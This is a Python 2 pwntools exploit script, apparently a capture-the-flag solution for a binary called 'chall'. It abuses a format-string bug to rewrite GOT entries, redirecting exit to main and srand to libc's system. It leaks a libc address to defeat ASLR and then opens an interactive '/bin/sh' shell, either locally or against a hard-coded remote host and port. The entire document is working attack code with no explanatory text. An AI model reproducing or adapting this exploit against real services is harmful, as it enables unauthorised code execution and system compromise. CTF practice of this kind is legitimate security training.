#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

e = ELF("./chall")
libc = ELF("./libc6.so")
context.binary = e
context.log_level = 'debug'

if "--tmux" in sys.argv:
	context.terminal = ['tmux','new-window']
else:
	context.terminal = ['terminator','-e']

if "--remote" in sys.argv:
	r = remote("35.186.153.116",5002)
else:
	r = process([e.path])
 	#gdb.attach(r)

def checkPayload(payload):
	payload = bytes(payload)
	print(repr(payload))
	badchars = [b'\\',b'\n',b'\x00',b'\"']
	for char in badchars:
		if char in payload:
			return False
	return True

main = 0x804871b
payload = fmtstr_payload(4,{e.got['exit']:main})
assert checkPayload(payload) == True
payload += "%2571$p.\n?\\"
r.sendafter(': \n',payload)

output = r.recv(280)
if 'f7' in output:
	output = output[output.find('f7'):output.find('f7')+8].decode()
else:
	print("Leak failed.")
	sys.exit()

leak = int(output,16)
log.info('LIBC LEAK: '+hex(leak))

libc_base = leak-247-libc.symbols['__libc_start_main']
log.info('LIBC BASE: '+hex(libc_base))

system = libc.symbols['system']

payload = fmtstr_payload(4,{e.got['srand']:libc_base+system})
assert checkPayload(payload) == True
payload += ".\n?\\"
r.sendafter(': \n',payload)

r.recvuntil(': ')
r.sendline('/bin/sh;\\')

r.interactive()